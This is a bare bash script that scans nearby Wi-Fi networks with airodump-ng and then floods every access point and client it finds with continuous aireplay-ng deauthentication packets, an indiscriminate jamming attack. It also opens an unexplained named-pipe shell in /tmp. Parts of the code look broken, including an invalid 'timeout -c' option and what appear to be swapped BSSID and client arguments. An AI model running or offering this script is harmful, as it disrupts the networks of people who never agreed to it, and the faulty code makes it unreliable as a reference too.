#!/bin/bash

function process(){
    cat ${1} | tr -c ' ' '\n' | grep ':' >> ${1}-list
}

sudo airmon-ng start wlan1
mkfifo /tmp/shell; tail -f /tmp/shell | /bin/sh 2>&1 > /tmp/shell &
while true
do
    timeout -c 20 bash -c "sudo airodump-ng wlan1mon >> /tmp/a2f"
    process /tmp/a2f
    for af2 in $(cat /tmp/a2f-list)
    do
        timeout -c 12 bash -c "sudo airodump-ng --bssid ${af2} wlan1mon >> /tmp/a3z"
        process /tmp/a3z
        for az3 in $(cat /tmp/a3z-list)
        do
            timeout -c 30 bash -c "sudo aireplay-ng -0 0 -c ${af2} -a ${az3} wlan1mon"
        done
        rm /tmp/{a3z,a3z-list}
    done
done